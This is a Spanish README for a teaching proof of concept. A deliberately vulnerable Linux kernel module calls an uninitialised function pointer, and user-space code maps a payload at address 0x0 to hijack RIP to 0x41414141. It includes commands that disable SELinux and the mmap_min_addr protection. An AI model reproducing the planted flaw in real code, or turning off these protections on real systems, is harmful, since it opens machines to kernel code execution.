Explotando la técnica Null Dereference
====================================

Este modulo y su POC demuestran como una referencia a NULL en el kernel puede causar ejecución de código arbitrario en nuestro sistema. Es difícil saber el año en que se comenzó a explotar esta técnica, pero según un artículo de John Corbet[1] parece ser que fue por 2009. Desde entonces se ha restringido el acceso a las zonas bajas de memoria del usuario, mitigando el problema de las referencias nulas mediante configuraciones con sysctl y SELinux. 

¿Cómo funciona todo esto?
=========================

Lo primero es desactivar las protecciones de memorias bajas de sysctl y SELinux. Lo segundo es cargar un módulo que tiene un principal objetivo: que cada vez que escribamos en su /proc/nullderef, se llame a una función que ha sido declarada pero no inicializada, es decir, a una funcion no referenciada:

```
void (*my_dereference_funptr)(void);  //Declarada pero no inicializada

ssize_t write_proc(struct file *filp,const char *buf,\
                   size_t count,loff_t *offp)
{
  my_dereference_funptr();            //Llamada a una función sin inicializar
  return count;
}
```

De esta forma, al no estar inicializada, la función tendrá como valor por defecto una dirección nula(la dirección 0x0); y al ejecutarla hará que se salte a 0x0, que es válida y conocida por el proceso en su espacio de usuario. 

El POC lo único que hace es cargar un payload en la dirección $0 y posteriormente escribir en /proc/nullderef para que se llame a la función write de arriba:

```
  memcpy(0, payload, sizeof(payload));        //Cargamos el payload en 0x0
  int fd = open("/proc/nullderef", O_WRONLY); 
  write(fd, "null dereference", 3);           //Y provocamos la llamada a una referencia nula en el kernel
```

Todo lo anterior acabará fatídicamente como un "RIP: 00:41414141. Bad RIP Value" en los registros del sistema, que es justamente el payload que cargamos en nuestro POC (jump 0x41414141).

Compilación
===========

Para compilar el proyecto, siga los siguientes pasos.

  1. make
  
Una vez compilado, cargamos el módulo, el cual habilitará una entrada en el sistema de ficheros /proc, llamada /proc/nullderef:
  
  2. sudo insmod module/nullderef_module.ko
 
Para que el sistema nos permita utilizar la técnica de null dereference debemos permitir que el usuario tenga acceso a zonas bajas de memoria, concretamente a la dirección 0x00000000, que es la clave de esta técnica.
  
  3. sudo sysctl -w vm.mmap_min_addr="0"

También, en el caso de tenerlo habilitado, debemos desactivar temporalmente SELinux, ya que también añade medidas de seguridad para prohibir al usuario accesos a zonas bajas de memoria. 
  
  4. sudo setenforce 0

Una vez desactivadas las barreras, ya podemos accedes y escribir en la dirección 0x0. Ejecutamos el POC, que lo que hará será modificar el EIP/RIP a 0x41414141, demostrando que la ejecución de código es posible.

  8. ./proc/proc_exec

El resultado final lo podemos ver en los log del kernel:
  
  9. dmesg | tail
     
     **RIP: 0010:0x41414141** RSP:0033:0x7ffff7af8ea4

[1] https://lwn.net/Articles/342330/
